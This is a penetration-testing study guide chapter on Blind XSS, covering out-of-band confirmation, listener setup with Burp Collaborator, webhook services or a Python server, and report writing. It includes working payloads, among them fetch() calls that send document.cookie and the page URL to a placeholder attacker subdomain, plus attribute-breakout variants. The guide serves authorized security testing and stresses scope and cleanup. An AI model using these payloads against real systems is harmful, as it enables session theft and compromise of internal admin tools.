# 05 — Blind XSS

## Definition Recap

Blind XSS is not a separate injection mechanism — it is a **Stored XSS** (file 03) whose execution point the tester cannot directly observe. The payload lands somewhere reviewed only by another party: an admin dashboard, a support-ticket viewer, a back-office log analyzer, a "report abuse" review queue, an internal Slack/email digest that renders submitted content. Since you never see the rendered page, you cannot simply check for an `alert()` box — you need the payload itself to **prove its own execution** by reaching out to infrastructure you control.

## The Core Technique: Out-of-Band (OOB) Confirmation

Instead of `alert(document.domain)`, a Blind XSS payload makes an **outbound HTTP request** to a unique, attacker-controlled URL the moment it executes. If that request arrives at your listener, you have cryptographic-grade proof of execution — no need to ever see the victim's screen.

### Minimal OOB Payload

```html
<script src="https://YOUR-UNIQUE-SUBDOMAIN.oastify.com/x"></script>
```
Breakdown:
- `<script src="...">` — instructs the browser to **fetch and execute** whatever JavaScript is served from that URL, exactly like loading any third-party script (analytics, ads, etc.) — this is a completely standard, unremarkable browser behavior, which is exactly why it's stealthy and reliable.
- The mere act of the browser **requesting** that URL is itself the proof you need — even if the listener serves an empty/404 response, you already captured the request (timestamp, source IP, User-Agent, cookies if any were sent) in your listener logs the instant the victim's browser parsed this tag.
- Using a fresh, **unique subdomain per payload submission** (not a shared static URL) is essential — it lets you correlate exactly which submission fired, when, and from which internal tool/IP, which matters when you've seeded the same payload into ten different form fields across an engagement and need to know which ones actually executed.

### Richer OOB Payload (Captures More Context)

```html
<script>
  fetch('https://YOUR-UNIQUE-SUBDOMAIN.oastify.com/log?c=' + encodeURIComponent(document.cookie) + '&u=' + encodeURIComponent(location.href));
</script>
```
Breakdown:
- `fetch(url)` — issues an asynchronous HTTP GET request to your listener using the browser's native networking, no special permissions required since this runs in the page's own origin context.
- `document.cookie` — captures the cookies accessible to JS in that execution context (note: `HttpOnly` cookies will **not** appear here — see the limitation note below).
- `encodeURIComponent(...)` — URL-encodes the cookie string and current page URL so special characters (`;`, `=`, `&`, spaces) don't break the query string you're constructing, ensuring the data arrives at your listener intact and parseable.
- `location.href` — captures exactly which internal page/URL the payload executed on, which is often the single most valuable piece of intel in a Blind XSS finding (it tells you *which internal tool* is vulnerable — e.g. `https://internal-support.company.com/tickets/4821` immediately tells you this fired in the support ticket viewer, not the admin user list).

## Setting Up Detection Infrastructure

### Option A — Burp Suite Collaborator (Built-In, Easiest)

1. In Burp Suite, open the **Collaborator** tab (Burp Suite Professional includes hosted Collaborator infrastructure by default; Community Edition has a limited public pool and is less reliable for real engagements due to shared/rate-limited infrastructure).
2. Click **Copy to clipboard** to generate a unique payload — Burp gives you a unique subdomain like `abcdef123456.oastify.com` tied to your session.
3. Embed that domain inside your XSS payload (as shown above) and submit it into the target field.
4. Poll **"Poll now"** in the Collaborator tab (or just leave the tab open — Burp auto-polls periodically) to check for incoming interactions. A successful hit shows the full HTTP request that arrived, including headers, timestamp, and source IP.
5. **Why Collaborator specifically helps beyond a generic listener:** it also detects DNS-only interactions (not just HTTP) — useful when a strict outbound firewall on the target's internal network blocks HTTP egress but still allows DNS resolution, which is common in locked-down corporate environments where Blind XSS often lives (internal admin tools).

### Option B — Self-Hosted Webhook Listener (When Collaborator Access Isn't Available)

Free webhook-capture services (e.g., webhook.site, or a self-hosted minimal HTTP listener on your own VPS) work as a substitute:
1. Generate a unique URL from the webhook service (each one is normally unique per session/page load automatically).
2. Use that exact URL in your payload (`<script src="https://webhook.site/YOUR-UNIQUE-ID"></script>` or the `fetch()` variant above pointed at that URL).
3. Check the webhook dashboard for incoming requests — most of these services show full request headers/body in a live-updating UI.
4. **Limitation vs. Collaborator:** no DNS-interaction-only detection, and you're trusting a third-party service with potentially sensitive captured data (cookies, internal URLs) — for client engagements, get explicit written authorization before sending captured client data to any third-party SaaS listener, or self-host your own minimal logging server instead.

### Option C — Self-Hosted Minimal Listener (Most Control, Most Setup)

A one-line Python listener on a VPS you control (useful when you need full data ownership for a client engagement, or need a custom response, e.g. serving an actual second-stage JS payload rather than just logging a hit):
```bash
python3 -m http.server 8080 --bind 0.0.0.0
```
Breakdown:
- `python3 -m http.server` — runs Python's built-in simple HTTP server module, sufficient for capturing inbound requests in logs without writing custom server code.
- `8080` — the port to listen on; ensure your VPS firewall/security group allows inbound traffic on this port (or use port 80/443 with a reverse proxy like Nginx if you want a clean URL without `:8080`).
- `--bind 0.0.0.0` — binds to all network interfaces so the VPS's public IP can actually reach this listener, not just `localhost`.
- Every inbound request (including the full path, query string, and headers) is printed to the terminal/log by default — this is enough to confirm a payload fired and to extract any data you encoded into the URL/path.
- For production use on a real engagement, put this behind HTTPS (via Caddy, Nginx+certbot, or Cloudflare Tunnel — consistent with your existing Cloudflare Tunnel deployment experience) since some internal corporate proxies block or flag plain HTTP egress more aggressively than HTTPS.

## Worked Payload Set for Real Blind-XSS Testing

When seeding Blind XSS payloads (e.g., into a support ticket subject, a "report this content" form, a contact form, a job application cover letter field — all classic Blind XSS targets), submit **multiple context-variant payloads simultaneously** since you don't know the rendering context in advance:

```html
<script src=https://UNIQUE1.oastify.com></script>
"><script src=https://UNIQUE2.oastify.com></script>
'><script src=https://UNIQUE3.oastify.com></script>
<img src=x onerror="fetch('https://UNIQUE4.oastify.com/?c='+document.cookie)">
javascript:fetch('https://UNIQUE5.oastify.com')
```
Breakdown of the strategy:
- Each line targets a different possible context: plain HTML body (`<script src=...>`), double-quote attribute breakout (`">`), single-quote attribute breakout (`'>`), an `innerHTML`-safe event-handler variant (`<img onerror=...>`), and a URL/scheme-injection context (`javascript:`).
- Using a **different unique subdomain per line** means a Collaborator/listener hit tells you exactly which context succeeded, without any ambiguity — critical since you have zero visibility into the rendered page.
- This "shotgun" approach is standard professional practice for Blind XSS specifically *because* you can't iterate live the way you can with Reflected/visible Stored XSS — you often get exactly one shot per submission before a support agent reviews and closes the ticket, so maximizing coverage per submission matters.

## Limitations to Understand and State Honestly

- **`HttpOnly` cookies will never appear in `document.cookie`** — if the session cookie has the `HttpOnly` flag, cookie-theft-style Blind XSS payloads will fail to capture it via JS, though the payload may still prove code execution and could pivot to other impact (e.g., performing actions as the privileged viewer via `fetch()` calls that ride along their session automatically, even without ever reading the cookie value directly — covered in file 09).
- **A Collaborator/webhook hit proves code execution, not full exploitation impact.** It confirms the vulnerability exists; you should still reason through (and ideally further demonstrate, where ethically/contractually permitted) what a real attacker could achieve from that execution context.
- **Timing matters.** Some internal review queues process submissions in batches (e.g., a nightly digest email rendering ticket subjects) — a payload might take hours to fire. Don't conclude "not vulnerable" too quickly; leave Blind XSS payloads seeded and check back per the engagement's timeline.

## PortSwigger Lab Mapping (Blind XSS)

PortSwigger's dedicated lab for this exact technique is:

| Lab | What it teaches |
|---|---|
| Exploiting cross-site scripting to capture passwords / Exploiting XSS to steal cookies (under "Exploiting XSS vulnerabilities" topic) | While not always labeled "Blind XSS" explicitly, these labs use the same Collaborator-based OOB exfiltration pattern central to Blind XSS — submit a payload, can't see the result directly, confirm via Collaborator polling |

> PortSwigger does not currently maintain a large dedicated "Blind XSS" lab category the way it does for Reflected/Stored/DOM — the *technique* (OOB confirmation via Collaborator) is taught primarily through the "Exploiting XSS vulnerabilities" topic labs and is meant to be combined with any Stored XSS lab as practice (treat any Stored XSS lab as a Blind XSS drill by submitting a Collaborator payload and confirming via the Collaborator tab instead of just visually checking for `alert()`).

## Real-World Engagement Notes

- **Blind XSS is one of the highest-value techniques in bug bounty programs** specifically because it routinely reaches internal admin panels that external testers otherwise can't access at all — a single hit can mean full back-office compromise, which is why many programs rate it critically even from a "simple" contact-form submission.
- **Always get explicit scope/authorization clarity before seeding Blind XSS payloads broadly** — submitting to every contact form, password-reset flow, and support channel of a target can trigger real internal alerts/tickets and consume real staff time reviewing your test submissions; this is a common point of friction in engagements if not pre-cleared with the client.
- **Clean up after yourself where possible.** If a payload successfully fires and you've proven the point, consider whether the stored payload should be removed/flagged for removal once impact is documented, especially in production environments — leaving live JS-executing payloads sitting in production admin tools beyond what's needed for evidence is poor practice.

## Common Mistakes

- Forgetting to actually check the Collaborator/webhook dashboard at all (or checking too soon, before any internal review cycle has happened).
- Using the same payload URL across many different submissions, making it impossible to tell which submission actually fired when multiple later show hits.
- Assuming a non-hit means "not vulnerable" rather than "didn't fire in the observed time window, or wasn't reviewed by a privileged user during testing" — Blind XSS absence-of-evidence is weaker evidence than for Reflected/visible Stored XSS.

## Report-Writing Notes

- Include the **full Collaborator/listener interaction log** (timestamp, source IP, headers) as direct evidence — this is your only "screenshot" for Blind XSS, so it needs to be complete and exact.
- Explicitly state **which internal feature/tool** the payload fired in, based on captured `location.href` data if available — this is often the most actionable detail for the client's remediation team.
- Be precise about confirmed vs. inferred impact: "confirmed JavaScript execution in an internal admin context via OOB callback" is accurate; "confirmed full admin account takeover" requires you to have actually demonstrated that follow-on action, not just inferred it.

---
**Next:** `06_CSP_Bypass.md`
